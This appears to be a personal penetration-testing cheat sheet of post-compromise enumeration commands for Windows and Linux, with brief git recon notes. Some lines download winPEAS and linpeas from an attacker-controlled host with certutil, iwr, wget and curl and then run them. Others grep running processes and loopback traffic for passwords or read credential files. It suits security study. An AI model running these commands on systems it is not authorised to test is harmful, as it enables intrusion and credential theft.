
| [[06 Initial Entry Point#Windows Enumeration\|Windows Enumeration]] | [[06 Initial Entry Point#Linux Enumeration\|Linux Enumeration]] | [[06 Initial Entry Point#GitHub Recon\|GitHub Recon]] |
| ---------------------------------------------------------------- | ------------------------------------------------------------ | -------------------------------------------------- |
## Windows Enumeration
```powershell
# User & Group Enumeration
C:\Users\offsec> whoami # username & hostname
C:\Users\offsec> whoami /groups # current user groups
C:\Users\offsec> whoami /priv # current user privileges
PS C:\Users\offsec> net user <USER> # display all info of user
PS C:\Users\offsec> Get-LocalUser # list all users
PS C:\Users\offsec> Get-LocalGroup # list all groups
PS C:\Users\offsec> Get-LocalGroupMember <GROUP> # list all members in group

# View system information
PS C:\Users\offsec> systeminfo

# Networking Info
PS C:\Users\offsec> ipconfig /all # list all network interfaces
PS C:\Users\offsec> route pring # display routing table
PS C:\Users\offsec> netstat -ano # list all active network connections

# Application & Process Info
PS C:\Users\offsec> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # list 32-bit applications
PS C:\Users\offsec> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # list 64-bit applications
PS C:\Users\offsec> Get-Process # list all running processes

# PowerShell History
PS C:\Users\offsec> Get-History # check history for current user
PS C:\Users\offsec> (Get-PSReadlineOption).HistorySavePath # find history file
# Use Event Viewer, filter source: PowerShell (Windows-PowerShell), filter EventID: 4104

# Searching filesystem
PS C:\Users\offsec> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue # search for config files in XAMPP
PS C:\Users\offsec> Get-ChildItem -Path C:\Users\offsec -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue # search for documents and textfiles in home dir

# winPEASx64.exe
kali@kali:~$ python3 -m http.server 80 # setup http server to serve winPEASx32/x64.exe
PS C:\Users\offsec> iwr -uri http://<KALI_IP>/winPEASx64.exe -Outfile winPEAS.exe # download winpeas via pwsh
C:\Users\offsec> certutil -urlcache -split -f "http://<KALI_IP>/winPEASx64.exe" winPEAS.exe # download winpeas via cmd 1
C:\Users\offsec> powershell -command Invoke-WebRequest -Uri http://<KALI_IP>:<PORT>/winPEASx64.exe -Outfile C:\\temp\\winPEAS.exe # download winpeas via cmd 2
C:\Users\offsec> .\winPEAS.exe
```
## Linux Enumeration
```shell
# User & Group Enumeration
kali@kali:~$ id # get userid and groupid
kali@kali:~$ cat /etc/passwd # get all users + some services
# Format: login_name:encrypted_password:uid:gid:comment:home_folder:login_shell
kali@kali:~$ sudo -l # check sudo capabilities
kali@kali:~$ cat /etc/sudoers # inspect sudo config

# System Information Enumeration
kali@kali:~$ hostname # get hostname (context clue on machine function)
kali@kali:~$ cat /etc/issue # OS information
kali@kali:~$ cat /etc/os-release # further OS information
kali@kali:~$ uname -a # kernel information (version & arch)
kali@kali:~$ uname -r # kernel version
kali@kali:~$ arch # system arch

# Networking Info
kali@kali:~$ ifconfig # TCP/IP configuration 1
kali@kali:~$ ip a # TCP/IP configuration 2
kali@kali:~$ route / routel # display routing tables
kali@kali:~$ netstat # display active network connections and listening ports 1
kali@kali:~$ ss -anp # display active network connections and listening ports 2
kali@kali:~$ cat /etc/iptables/rules.v4 # inspect firewall conf rules
# can also search for files created by iptables-save, check /etc or grep filesystem

# Application & Process Info
kali@kali:~$ ps aux # list system processes
kali@kali:~$ dpkg -l # list installed packages
kali@kali:~$ watch -n 1 "ps -aux | grep pass" # enumerate running processes to harvest credentials
kali@kali:~$ sudo tcpdump -i lo -A | grep "pass" # capture traffic on loopback and dump

# Shell History
kali@kali:~$ cat .bashrc # might have hidden text
kali@kali:~$ env # inspect user's env variables

# Crontab / Scheduled Tasks
kali@kali:~$ ls -lah /etc/cron* # inspect scheduled tasks
kali@kali:~$ cat /etc/crontab # inspect sysadmin scheduled tasks 1
kali@kali:~$ sudo crontab -l # inspect sysadmin scheduled tasks 2
kali@kali:~$ crontab -l # inspect current user's scheduled tasks
kali@kali:~$ grep "CRON" /var/log/syslog

# Misc
kali@kali:~$ mount # list all mounted filesystems
kali@kali:~$ cat /etc/fstab # list drives mounted at boot
kali@kali:~$ lsblk # view all available disks
kali@kali:~$ lsmod # enumerate loaded kernel modules
kali@kali:~$ /sbin/modinfo libata # get details on specific kernel module (filename & version)

# linpeas.sh
kali@kali:~$ python3 -m http.server 80 # setup http server to serve linpeas.sh
kali@kali:~$ wget http://<KALI_IP>/linpeas.sh # download with wget
kali@kali:~$ curl http://<KALI_IP>/linpeas.sh linpeas.sh # download with curl
kali@kali:~$ chmod u+x linpeas.sh # allow execute
kali@kali:~$ ./linpeas.sh # run linpeas

# unix-privesc-check
./unix-privesc-check standard (> output.txt) # run unix-privesc-check (and store to output.txt)
```
## GitHub Recon
```shell
# If there are traces of the .git files, there could be a potential repo there

# Log information of current repo
git status

# Show commit history
git log

# View old commit
git show <commit-id>
```